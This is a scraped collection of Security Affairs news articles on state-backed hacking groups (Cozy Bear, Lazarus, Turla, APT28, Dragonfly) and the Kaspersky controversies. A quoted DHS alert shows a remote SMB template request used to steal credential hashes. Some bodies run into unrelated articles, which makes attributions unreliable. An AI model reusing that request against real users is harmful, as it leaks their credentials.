\u2018hacked\u2019 Russian Cozy Bear systems for years\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 26, 2018", "body": "It\u2019s not a mystery, technology firms that intend to work with Russia need to allow the Government experts to scan their code for backdoors and vulnerabilities.\n\nThe problem is that this software is often used by the US Government, this means that Russian experts could found bugs or backdoors to exploit in cyber attacks against US Agencies.\n\nMany tech giants already allowed their software review, including McAfee, SAP, Symantec, and HPE, the risk is that foreign Governments could exploit a bug or a backdoor to control them.\n\nAnyway, other firms like Trend Micro has refused to allow the Russians to conduct a source code review of their products.\n\nOf course, the companies defend their position clarifying that the code review s were done under controlled conditions and that not code was allowed to be copied.\n\nNews of the day is that the Dutch intelligence service AIVD \u2018hacked\u2019 Russian state-sponsored hackers.\n\nThe news was reported by the newspaper de Volkskrant, AIVD in 2014 monitored the activity of the Russian APT Cozy Bear (aka APT29) and its efforts to hack into systems at the US Democratic Party\u2018s and US government servers.\n\nDutch intelligence service AIVD provided the FBI with crucial information about Russian interference with the American elections.\n\n\n\nThe AIVD cyber spies compromised security cameras surrounding the building used by the Cozy Bear crew, the Dutch agents were looking for known Russian spies accessing the structure.\n\n\u201cHackers from the Dutch intelligence service AIVD have provided the FBI with crucial information about Russian interference with the American elections,\u201d reports the Dutch daily newspaper Volkskrant.nl.\n\n\u201cThat\u2019s how the AIVD becomes witness to the Russian hackers harassing and penetrating the leaders of the Democratic Party, transferring thousands of emails and documents.

Security researchers discovered that North Korean Lazarus APT group was behind attacks on banks, including the Bangladesh cyber heist.\n\nIn the last campaigns against financial firms, the cyber spies launched watering hole attacks and leveraged a variant of the Lazarus-linked RATANKBA Trojan.\n\n\u201cThe malware known as RATANKBA is just one of the weapons in Lazarus\u2019 arsenal. This malicious software, which could have been active since late 2016, was used in a recent campaign targeting financial institutions using watering hole attacks. The variant used during these attacks (TROJ_RATANKBA.A) delivered multiple payloads that include hacking tools and software targeting banking systems.\u201d reads the analysis published by Trend Micro.\n\n\u201cWe analyzed a new RATANKBA variant (BKDR_RATANKBA.ZAEL\u2013A), discovered in June 2017, that uses a PowerShell script instead of its more traditional PE executable form\u2014a version that other researchers also recently identified.\u201c\n\nThe researchers identified and hacked in some servers used by the cyber spies for temporarily storing stolen data, the analysis of the backend revealed that around 55% of the victims were located in India and neighboring countries.\n\nThe majority of the victims were not using enterprise versions of Microsoft software, less than 5% of the victims were Microsoft Windows Enterprise users.\n\nThe IP addresses of the victims don\u2019t belong to a large bank or a financial institution, according to Trend Micro victims are likely employees of three web software development companies in India and one in South Korea.\n\nThe RATANKBA Trojan is delivered via weaponized Office documents (containing topics related to cryptocurrencies and software development), CHM files, and script downloaders.\n\nExperts noticed that attackers don\u2019t implement a real-time communication with the malware. Once compromised a target machine, the attackers will use a Remote Controller tool to send jobs to the system, the queue of jobs is then processed by RATANKBA.\n\n\u201cDuring our analysis, we collected a copy of the RATANKBA malware\u2019s Lazarus Remote Controller tool. The remote controller provides a user interface that allows attackers to send jobs to any compromised endpoint. The controller gives the attackers the ability to manipulate the victims\u2019 host by queueing tasks on the main server. RATANKBA retrieves and executes the tasks, and retrieves the collected information.\u201d continues the analysis.\n\nThe controller tools used by the Lazarus APT implements a graphical UI interface that allows hackers to push code to the server and download victim profiles from it.\n\n\n\nTrend Micro also provided a profile of the members of the Lazarus APT group, the hackers appear to be native Korean speakers and at least one of them is believed to also understand Chinese.\n\n\u201cGiven Lazarus\u2019 use of a wide array of tools and techniques in their operations, it\u2019s reasonable to assume that the group will continue to use ever-evolving tactics in their malicious activities.\u201d concluded Trend Micro.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Lazarus APT Group, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/bitcoin", "topic_name": "Bitcoin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lazarus-apt", "topic_name": "Lazarus APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ratankba", "topic_name": "RATANKBA"}]}, {"news_name": "Dark Caracal APT \u2013 Lebanese intelligence is spying on targets for years", "news_link": "https://securityaffairs.co/wordpress/67915/apt/dark-caracal-apt.html", "title": "Dark Caracal APT \u2013 Lebanese intelligence is spying on targets for years\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 19, 2018", "body": "Cyber spies belonging to Lebanese General Directorate of General Security are behind a number of stealth hacking campaigns that in the last six years, aimed to steal text messages, call logs, and files from journalists, military staff, corporations, and other targets in 21 countries worldwide.\n\nNew nation-state actors continue to improve offensive cyber capabilities and almost any state-sponsored group is able to conduct widespread multi-platform cyber-espionage campaigns.\n\nThis discovery confirms that the barrier to entry in the cyber-warfare arena has continued to\ndecrease and new players are becoming even more dangerous.\n\nThe news was reported in a detailed joint report published by security firm Lookout and digital civil rights group the Electronic Frontier Foundation.\n\nThe attack chain implemented by Dark Caracal relies primarily on social engineering, the hackers used messages sent to the victims via Facebook group and WhatsApp messages. At a high-level, the hackers have designed three different kinds of phishing messages to trick victims into visiting a compromised website, a typical watering hole attack.\n\n\n\n \n\nThe malicious app could exfiltrate text messages, including two-factor authentication codes, and other data from the victim\u2019s device.

No matter.\n\nIn the past months, security experts have collected evidence that links the Russian Government to massive propaganda operations through social networks aimed to influence the sentiment of Americans on the 2016 Presidential elections.\n\nI was analyzing requests for the submissions of White Papers for INSCOM (U.S. Army Intelligence & Security Command) Technology when I noticed a number of very interesting requests for a \u201cContent Translation of PAI,\u201d \u201cAutomated Sentiment Analysis (SA),\u201d and \u201cContent Generation Based off of PAI\u201d\n\nLet\u2019s give a look at the requirements for each requets:\n\n0001: Content Translation of PAI\n\nA. Capability to translate foreign language content (message text, voice, images, etc.) from the social media environment into English. Required languages are Arabic, French, Pashtu, Farsi, Urdu, Russian, and Korean.\n\nB.

Capability to translate English into Arabic, French, Pashtu, Farsi, Urdu, Russian, and Korean.\n\nB. Automated capability to generate/create at least three, and up to 10, unique statements derived from one (1) original social media statement, while retaining the meaning and tone of the original.\n\n1. Customize language in a dialect consistent with a specific audience including spelling variations, cultural variations, colloquial phrasing, and social media brevity codes and emojis.\n\n\n\nWell, considering that the INSCOM executes mission command of operational intelligence and security forces, this software could be used for both monitoring social media (with a specific focus on Arabic, French, Pashtu, Farsi, Urdu, Russian, and Korean contents).\n\nThe requirements specifically address the need to create a system to influence the public sentiment on specific topics (i.e. Capability to determine anger, pleasure, sadness, and excitement.)\n\nI have released this interview to explain my point of view on such kind of software:\n\n\n\nWhat\u2019s the need for such software?\n\nSuch kind of software could be used for social media monitoring. Not only, in this specific case, the project aims to build a machine learning system that is able to identify and influence the sentiment of a specific audience. No doubt, it is software that could be used in PSYchological OPerations (PSYOPs).\n\nWould such software be a threat, or would it be just for snooping?\n\nThis kind of software could be used also to influence the sentiment on specific topics. This software represents a serious threat to the privacy of citizens, but the most disconcerting aspect is that IA based system could be involved in operations to destabilize a political context. Social media are a powerful instrument to make propaganda and to promote mass demonstration, we have all in mind what has happened in the case of the Arab Spring.\n\nThe United States Army Intelligence and Security Command \u2013 collects intelligence for combat operations\u2026 so how would this new software be useful?\n\nIt is an essential software for any Army and Command and Intelligence agency involved in intelligence mission. These systems are essential to gather information from social media and represent a privileged tool for SOCMINT, Social media intelligence.\n\nSOCMINT could be used for several purposes, not only cyber-espionage but also for counterterrorism operations.\n\nClearly, the most disconcerting use is related to the influence of public sentiment on specific topics.\n\nThe U.S. has continually accused Russia of using bots and troll factories to influence U.S. social media\u2026 isn\u2019t this an attempt to do the same. What\u2019s your take on that?\n\nI believe that almost any government is involved in social media monitoring, many states use social media as a military weapon. The answer is that the risk is concrete, but at the moment we have no evidence of this. The software could be used also as a defense mechanism against PSYOPs conducted by foreign goverments through social media.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  US Army,  PSYOPS)\n\n", "topics": ""}, {"news_name": "Turla APT group\u2019s espionage campaigns now employs Adobe Flash Installer and ingenious social engineering", "news_link": "https://securityaffairs.co/wordpress/67584/apt/turla-apt-adobe-installer.html", "title": "Turla APT group\u2019s espionage campaigns now employs Adobe Flash Installer and ingenious social engineering\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 10, 2018", "body": "Security researchers from ESET who have analyzed recent cyber espionage campaigns conducted by the dreaded Turla APT group reported that hackers leverage on malware downloaded from what appears to be legitimate Adobe URLs and IP addresses.\n\nTurla is the name of a Russian cyber espionage APT group (also known as Waterbug, Venomous Bear and KRYPTON) that has been active since at least 2007 targeting government organizations and private businesses.\n\nThe list of victims is long and includes also the Swiss defense firm RUAG, US Department of State, and the US Central Command.\n\nThe Turla\u2019s arsenal is composed of sophisticated hacking tools and malware tracked as Turla (Snake and Uroburos rootkit), Epic Turla (Wipbot and Tavdig) and Gloog Turla.

Not only is it packaged with the real Flash installer, but it also appears to be downloaded from adobe.com.\u201d reads the report published by ESET.\n\n\u201cFrom the endpoint\u2019s perspective, the remote IP address belongs to Akamai, the official Content Delivery Network (CDN) used by Adobe to distribute their legitimate Flash\ninstaller. \u201c\n\nResearchers noted that Turla installers were exfiltrating information to get.adobe.com URLs since at least July 2016, data were sent back to legitimate URLs at Adobe.com. The download attempts observed by ESET observed were made through HTTP and not via HTTPS, the researchers state with confidence that Adobe was not compromised.\n\nThe social engineering technique adopted by Turla group to trick victims into believing they are downloading a legitimate software from Adobe server is very ingenious.\n\nData collected by the experts revealed that most of the victims belong to the former USSR, targeted entities include embassies and consulates located in East Europe.\n\nAt the time of the report is still unclear how the Turla APT group distributed the backdoor through Adobe.com.\n\nExperts speculate that this is possible by compromising a machine on the victim\u2019s network to perform a local man-in-the-middle attack. In this attack scenario, the threat actors redirect traffic from a target system through the compromised server and modifying it on the fly. Another possibility is to leverage on a compromised local gateway that could allow the attackers to potentially intercept and modify traffic for the whole organization.\n\nOther attacks scenarios see Turla executing a man-in-the-middle attack at the ISP level, or BGP hijacking.\n\n\u201cWe quickly discarded the hypothesis of a rogue DNS server, since the IP address corresponds to the servers used by Adobe to distribute Flash.\u201d continues the report. \u201cThus, these are the hypotheses that remain: \u278a a Man-in-theMiddle\n(MitM) attack from an already-compromised machine in the local network, \u278b a compromised gateway or proxy of the organization, \u278c a MitM attack at the Internet Service Provider (ISP) level or \u278d a Border Gateway Protocol (BGP) hijack to redirect the traffic to Turla-controlled servers a MitM attack at the Internet Service Provider (ISP) level or \u278d a Border Gateway Protocol (BGP) hijack to redirect the traffic to Turla-controlled servers.\u201d\n\n\n\nResearchers believe the most likely scenario sees attackers controlling the router for the traffic hijacking.\n\nSuch kind of attack is any way possible because the files are downloaded via HTTP, for this reason, it is important to avoid installing any update or software that was downloaded through unsecured connections.\n\nAdministrators must also check that Flash Player installers downloaded are properly signed with a valid Adobe certificate.\n\nFurther information, including the IOCs are included in the report published by ESET.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Turla APT group, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/adobe", "topic_name": "Adobe"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/turla-apt", "topic_name": "Turla APT"}]}, {"news_name": "US National Security Agency Director Admiral Mike Rogers to Retire", "news_link": "https://securityaffairs.co/wordpress/67487/security/nsa-admiral-mike-rogers-retires.html", "title": "US National Security Agency Director Admiral Mike Rogers to Retire\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 8, 2018", "body": "After a four-year term, the National Security Agency chief Admiral Mike Rogers plans to retire within months.\n\nThe Admiral Mike Rogers was chosen by President Barack Obama in 2014 when he replaced Gen.

Security researchers discovered that North Korean Lazarus APT group was behind recent attacks on banks, including the Bangladesh cyber heist.\n\nAccording to security experts, the group was behind, other large-scale cyber espionage campaigns against targets worldwide, including the Troy Operation, the DarkSeoul Operation, and the Sony Picture hack.\n\nLazarus is believed to be the first nation state attacker that is targeting a point-of-sale using a framework to steal payment card data.\n\nThe timing is perfect, the hackers are intensifying their operation around Christmas shopping season.\n\nThe arsenal of the Lazarus APT group includes sophisticated custom-made malware, DDoS botnets, and wiper malware.\n\nThe research paper published by the experts detail a new implant dubbed PowerRatankba, a PowerShell-based malware variant that closely resembles the original Ratankba implant.\n\nExperts also documented a new and emerging threat dubbed RatankbaPOS targeting the point-of-sale systems.\n\n\n\n\u201cThe Lazarus Group is a sophisticated, state-sponsored APT group with a long history of successful destructive, disruptive, and costly attacks on worldwide targets.

However, in this case we were able to extensively document the custom-built tools and procedures that Lazarus group is using to perform cryptocurrency theft.\n\nThis group now appears to be targeting individuals rather than just organisations: individuals are softer targets, often lacking resources and knowledge to defend themselves and providing new avenues of monetisation for a state-sponsored threat actor\u2019s toolkit. Bringing the tools and resources of a state-sponsored attack group to bear against individuals and infrastructure used by large numbers of private citizens raises the stakes considerably when assessing potential impact.\n\nWe were able to differentiate the actions of the financially motivated team within Lazarus from those of their espionage and disruption groups that have recently grabbed headlines, providing better insight into their operations and the worldwide threat represented by Lazarus.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Lazarus APT group, cryptocurrencies)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/crypto-currencies", "topic_name": "crypto currencies"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lazarus-apt", "topic_name": "Lazarus APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/powerratankba", "topic_name": "PowerRatankba"}]}, {"news_name": "The thin line between BlackEnergy, DragonFly and TeamSpy attacks", "news_link": "https://securityaffairs.co/wordpress/66867/apt/blackenergy-dragonfly-teamspy-attacks.html", "title": "The thin line between BlackEnergy, DragonFly and TeamSpy attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 19, 2017", "body": "On September 6, Symantec published a detailed analysis of the Dragonfly 2.0 campaign that targeted dozens of energy companies this year.

As reported by BBC, \u201cRussia is upgrading and advancing it\u2019s use of conventional and unconventional warfare,\u201d especially in the fifth domain: The Cyberspace.\n\nRussian ships have been spotted regularly near the Atlantic cables and according to Marshal Peach, it is due to the lack of investments in upgrading UK Navy to match the developments of Russia Navy. The Marshal also notice that there are not enough UK ships to monitor the activities of Russia Navy. It is important to notice that since the annexation of Crimea, Russia is developing new technologies of Electronic Warfare which is putting in danger the global security.\n\n\n\nBesides the economic danger to UK and US economies, Russian ships can also try to wiretapping and disrupt communications that could cause great danger to the intelligence community and national security of many countries.\n\nThe news comes in the midst of scandals involving Russian meddling in US election and the use of Kaspersky software, recently banned from US Government use, to spy on US Government Data. This brings some serious concerns about how secure we are in this interconnected world we live in. A new Theater of Operations is presented were rogue nations can seriously damage our way of live.\n\nIt is a serious concern since that Russia is not alone trying to undermine the world, as it has a partnership with Iran, North Korea, Syria, China and Brazil trying to destabilize the global security and economy. We must notice that to China and Brazil had contributed to Russia Cyber Upgrade since this two countries are the leading source of software piracy that causes serious economic losses and exposures to organizations around the world. In Brazil, for example, a copy of Microsoft Windows is sold for 3 dollars on the streets of Santa Ifig\u00eania.\n\nThe US and Europe must take a firm stance with sanctions against those rogue nations and maintain an up to date investment in Navy to continuously monitor any activity that could lead to dangers to the global security. Also according to BBC, it is estimated that 97% of global communications are transmitted by underwater cables, and approximately 10 trillion of financial transaction is negotiated on a daily basis through these cables. Any scenario involving an attack to this critical infrastructure could lead not only to an enormous loss of money but also to an enormous loss of life and the collapse of modern society due to its implications on supply chain and product delivery.\n\nhttp://www.natolibguides.info/hybridwarfare/reports\nhttps://www.icds.ee/fileadmin/media/icds.ee/doc/ICDS_Report_Russias_Electronic_Warfare_to_2025.pdf\nRussia\u2019s Neighbors Respond to Putin\u2019s \u2018Hybrid War\u2019\nhttp://www.armyupress.army.mil/Journals/Military-Review/Online-Exclusive/2017-Online-Exclusive-Articles/Russian-Actions-and-Methods/\n[1]http://www.europarl.europa.eu/RegData/etudes/BRIE/2017/599315/EPRS_BRI(2017)599315_EN.pdf\n\nhttps://rusi.org/event/annual-chief-defence-staff-lecture-2017\nhttps://www.theregister.co.uk/2017/12/15/russia_cable_chop_warning_chief_of_defence_staff/\nhttps://www.washingtontimes.com/news/2017/dec/15/britain-warns-russian-threat-undersea-internet-cab/\n\nRussia a \u2018risk\u2019 to undersea cables, defence chief warns\n\n\n\n\nRussia \u2018could CRIPPLE Britain by cutting undefended undersea internet cables\u2019\n\n\n[2]http://www.bbc.com/news/uk-42362500\nhttp://www.bbc.com/news/world-42365191\nhttp://www.newsweek.com/russian-forces-could-cause-catastrophe-west-cutting-internet-cables-749047\nhttp://metro.co.uk/2017/12/16/russian-drones-could-cripple-uk-by-cutting-underwater-communication-cables-7164453/\nhttps://www.yorkshirepost.co.uk/news/vital-undersea-cables-exposed-to-attacks-from-hostile-powers-says-yorkshire-mp-1-8891193\nhttps://policyexchange.org.uk/wp-content/uploads/2017/11/Undersea-Cables.pdf\n\nChief of Defence Staff echoes Policy Exchange warning on undersea cables\n\n\nhttps://www.maritime-executive.com/article/uk-defense-chief-warns-of-threats-to-subsea-cables\nhttp://www.telegraph.co.uk/news/2017/12/14/russia-has-ability-disrupt-britains-internet-access-head-armed/\nhttps://www.submarinecablemap.com/\nhttps://www.theguardian.com/world/2017/dec/14/russia-could-cut-off-internet-to-nato-countries-british-military-chief-warns\nhttp://www.independent.co.uk/news/uk/home-news/russia-attack-uk-cables-underwater-sea-protection-a8111536.html\nhttps://www.npr.org/sections/thetwo-way/2017/12/15/571033102/top-british-officer-russia-may-be-able-to-cut-undersea-cables\nhttps://www.thetimes.co.uk/article/economy-vulnerable-to-russian-attack-on-undersea-cable-links-rqqf0fxj8\nhttps://www.ft.com/content/dfbc0988-e0ee-11e7-a8a4-0a1e63a52f9c\nhttps://news.sky.com/story/uks-undersea-cables-at-risk-of-potentially-catastrophic-attack-by-russians-11171237\nhttps://www.newsmax.com/newsfront/russia-undersea-cables-britain/2017/12/15/id/831966/\nhttp://www.mirror.co.uk/news/uk-news/britain-fears-russia-could-cut-11698654\nhttps://sputniknews.com/analysis/201712151060039576-undersea-cables-uk-russia/\nhttps://sputniknews.com/world/201712151060027448-russia-nato-internet-uk/\nhttps://thediplomat.com/2015/10/undersea-cables-how-russia-targets-the-wests-soft-underbelly/\nhttp://www.euronews.com/2017/12/15/russia-could-cut-internet-sea-cables-in-new-threat-to-west-uk-defence-chief\nhttp://www.business-standard.com/article/international/russia-could-cut-uk-s-undersea-internet-cables-warns-defence-chief-117121501327_1.html\nhttp://www.businessinsider.com/russians-may-be-planning-to-cut-undersea-cables-2015-10\n\n \n\nAbout the author Luis Nakamoto\n\nLuis Nakamoto is a Computer Science student of Cryptology and an enthusiastic of information security having participated in groups like Comiss\u00e3o Especial de Direito Digital e-Compliance (OAB/SP) and CCBS (Consci\u00eancia Cibern\u00e9tica Brasil) as a researcher in new technologies related to ethical hacking, forensics, and reverse engineering.

So to do its job properly, an AV product must (a) be highly intrusive within a network so it can find malware, and (b) be able to communicate back to the vendor so it knows what it is looking for and what needs to be done to defeat the infiltration.  It is therefore obvious why this matters in terms of national security.  We need to be vigilant to the risk that an AV product under the control of a hostile actor could extract sensitive data from that network, or indeed cause damage to the network itself.\u201d reads the letter.\n\n\u201cThat\u2019s why the country of origin matters.  It isn\u2019t everything, and nor is it a simple matter of flags \u2013 there are Western companies who have non-Western contributors to their supply chain, including from hostile states.  But in the national security space there are some obvious risks around foreign ownership.\u201d\n\n\u201cThe specific country we are highlighting in this package of guidance is Russia.\u201d \n\nThe official warns of the risk of exposure of classified information to the Russian state that would be a risk to national security, for this reason a Russia-based AV company should not be chosen. It is an obvious reference to the Kaspersky case.\n\n\n\nThe Letter suggests banning the software developed by Russia-based companies from any system processing information classified SECRET and above.\n\n\u201cTo that end, we advise that where it is assessed that access to the information by the Russian state would be a risk to national security, a Russia-based AV company should not be chosen.  In practical terms, this means that for systems processing information classified SECRET and above, a Russia-based provider should never be used.\u201d continues the Letter.\n\n \u201cThis will also apply to some Official tier systems as well, for a small number of departments which deal extensively with national security and related matters of foreign policy, international negotiations, defence and other sensitive information.\u201d\n\nMartin confirmed that the NCSC is currently discussing with Kaspersky Lab about whether the UK Government can develop a framework that can be independently verified giving the Government assurance about the security of the involvement of the Russian firm in the wider UK market.\n\n\u201cIn particular we are seeking verifiable measures to prevent the transfer of UK data to the Russian state.  We will be transparent about the outcome of those discussions with Kaspersky Lab and we will adjust our guidance if necessary in the light of any conclusions.\u201d continues the Letter.\n\nIn response to the current situation, Kaspersky launched the Transparency Initiative in late October that allows government agencies to review the its security software for backdoors.\n\nPierluigi Paganini \n\n(Security Affairs \u2013 NCSC, Cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/ban", "topic_name": "ban"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybersecurity", "topic_name": "Cybersecurity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fsb", "topic_name": "FSB"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gchq", "topic_name": "GCHQ"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky-lab", "topic_name": "Kaspersky Lab"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ncsc", "topic_name": "NCSC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}]}, {"news_name": "Kaspersky case \u2013 Now we know who is the NSA hacker who kept Agency\u2019s cyber weapons at home", "news_link": "https://securityaffairs.co/wordpress/66258/cyber-warfare-2/nsa-hacker-kaspersky.html", "title": "Kaspersky case \u2013 Now we know who is the NSA hacker who kept Agency\u2019s cyber weapons at home\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "December 2, 2017", "body": "A member of the US National Security Agency Tailored Access Operations hacking team, Nghia Hoang Pho (67) pleaded guilty in a US district court in Baltimore on Friday to one count of willful retention of national defense information.\n\nThe Vietnam-born American citizen, who lives in Ellicott City, Maryland, has been charged with illegally removing top secret materials.\n\nThe NSA hacker admitted taking home copies of classified NSA hacking tools and exploits with the knowledge that they were cyber weapons.\n\nThe tools were detected by the Kaspersky Lab software installed on the NSA hacker\u2019s personal computer and were sent back to Kaspersky\u2019s server for further analysis.\n\nKaspersky Lab, published recently a detailed report on how cyber spies could have easily stolen the software exploits from the NSA employee\u2019s Windows PC.\n\nAccording to the telemetry logs collected by the Russian firm, the staffer temporary switched off the antivirus protection on the PC, and infected his personal computer with a spyware from a product key generator while trying to use a pirated copy of Office.\n\nOn September 11, 2014, Kaspersky antivirus detected the Win32.GrayFish.gen trojan on the NSA employee\u2019s PC, sometime later the employee disabled the Kaspersky software to execute the activation-key generator.\n\nThen the antivirus was reactivated on October 4, it removed the backdoored key-gen tool from the NSA employee\u2019s PC and uploaded it to Kaspersky\u2019s cloud for further analysis.\n\nKaspersky published a second report that sheds the light on the investigation conducted by the firm on the NSA-linked Equation Group APT.\n\nKaspersky has begun running searches in its databases since June 2014, 6 months prior to the year the alleged hack of its antivirus, for all alerts triggered containing wildcards such as \u201cHEUR:Trojan.Win32.Equestre.*\u201d.

With this network design, even when an implant is discovered on the infected machine, it is very hard to attribute it by monitoring the malicious traffic.\n\n\u201cEach operation anonymously registers at least one cover domain (e.g. \u201cperfectly-boring-looking-domain.com\u201d) for its own use. The server running the domain website is rented from commercial hosting providers as a VPS (virtual private server) and its software is customized according to CIA specifications.

reported that a new victim of the hacker group is an oil and gas company in the MENA region. The hackers compromised the system at the security firm and exfiltrated information for more than a year.\n\nThe Gaza cybergang added to its arsenal an Android Trojan that was first spotted by Kaspersky in April 2017 on a command and control (C&C) server likely used by the group to target Israeli soldiers.\n\n\u201cIn mid-2017, the attackers were discovered inside an oil and gas organization in the MENA region, infiltrating systems and pilfering data, apparently for more than a year.

Ironically the decoy document is a deceptive flyer relating to the Cyber Conflict U.S. conference. CyCon US is a collaborative effort between the Army Cyber Institute at the United States Military Academy and the NATO Cooperative Cyber Military Academy and the NATO Cooperative Cyber Defence Centre of Excellence.\u201d states the report published by CISCO Talos.\n\n\u201cDue to the nature of this document, we assume that this campaign targets people with an interest in cyber security.\u201d\n\n\n\nThe technique to use cyber security conferences as a lure in cyber espionage operations is well known, other threat actors in the past used the same tactic. Last year, a Chinese cyber espionage group known as Lotus Blossom attempted to lure victims with fake invitations to a Palo Alto Networks\u2019 Cybersecurity Summit.\n\nThe attackers didn\u2019t use any zero-day vulnerabilities in this last campaign, instead, they relied on weaponized Office documents containing VBA scripts used to deliver a new variant of Seduploader (also known as GAMEFISH backdoor, Sednit, JHUHUGIT and Sofacy).\n\nThe Seduploader malware, also known as GAMEFISH backdoor, Sednit, JHUHUGIT and Sofacy, is a strain of malware that has been already used by the threat actor in other campaigns against NATO representatives.\n\n\u201cIn the previous campaign where adversaries used Office document exploits as an infection vector, the payload was executed in the Office word process. In this campaign, adversaries did not use any exploit. Instead, the payload is executed in standalone mode by rundll32.exe,\u201d continues the report.\n\nThe Seduploader is a reconnaissance malware that was used for years by APT28, it is composed of 2 files: a dropper and a payload. The experts noticed that dropper and the payload are quite similar to the previous versions but the author modified some public information such as MUTEX name, obfuscation keys.\n\nHackers made these modifications to avoid detection of security solutions.\n\nThe CCDCOE published an alert on its website to warn people interested in the CyCon conference about the attack.\n\n\u201cInformation from CyCon U.S. website has been used in a Word document with an intent to deliver malware. This type of attack, where legitimate information is used to attract the attention of victims, is rather common and normally detected and prevented in information systems with widely used safeguards.\u201d reads the alert.\n\n\u201cThis is clearly an attempt to exploit the credibility of Army Cyber Institute and NATO CCDCOE in order to target high-ranking officials and experts of cyber security,\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 APT28, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/adobe-flash", "topic_name": "Adobe Flash"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/apt28", "topic_name": "APT28"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}]}, {"news_name": "DHS and FBI warn of ongoing attacks on energy firms and critical infrastructure", "news_link": "https://securityaffairs.co/wordpress/64625/apt/dhs-energy-firms-attacks.html", "title": "DHS and FBI warn of ongoing attacks on energy firms and critical infrastructure\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 22, 2017", "body": "The US Department of Homeland Security (DHS) and the FBI have issued a warning that APT groups are actively targeting government departments, and firms working in the energy, nuclear, water, aviation, and critical manufacturing sectors.\n\nThe warning was sent to the organization via email on Friday to inform them of Advanced Persistent Threat Activity targeting energy and other critical infrastructure sectors since at least May 2017.\n\n\u201cSince at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases, have leveraged their capabilities to compromise victims\u2019 networks.\u201d reads the alert.\n\n\u201cAnalysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. \u201c\n\n\n\nThe hackers use to target third-party suppliers and contractors (\u201cstaging targets\u201d) to hit intended institution.\n\nThe attackers leverage the staging targets\u2019 networks as pivot points and malware repositories when launching the attacks on their final intended victims.\n\nAccording to the warning, the campaign is still ongoing, the government experts believe it is operated by the Dragonfly hacking group (aka Energetic Bear) that has been active since at least 2011 when it targeted defense and aviation companies in the US and Canada.  Only in a second phase Dragonfly has focused its effort on US and European energy firms in early 2013.\n\nIn 2014, security experts at Symantec uncovered a new campaign targeting organizations located in the US, Italy, France, Spain, Germany, Turkey, and Poland.\n\nDragonfly gang conducted a cyber espionage campaign against energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers.\n\nAccording to the JAR report published by the US Department of Homeland Security, Dragonfly was Russian APT actor linked to the Government.\n\nThe infamous group remained under the radar since December 2015, but now the researchers pointed out Dragonfly targeted energy companies in Europe and the US.\n\nIn September 2017, the attackers aimed to control or even sabotage operational systems at energy facilities.\n\nBack to the ongoing campaign, the attackers launched a spear-phishing campaign.\n\n\u201cThroughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//<remote IP address>/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user\u2019s credential hash to the remote server prior to retrieving the requested file.\u201d states the alert. \u201c(Note: It is not necessary for the file to be retrieved for the transfer of credentials to 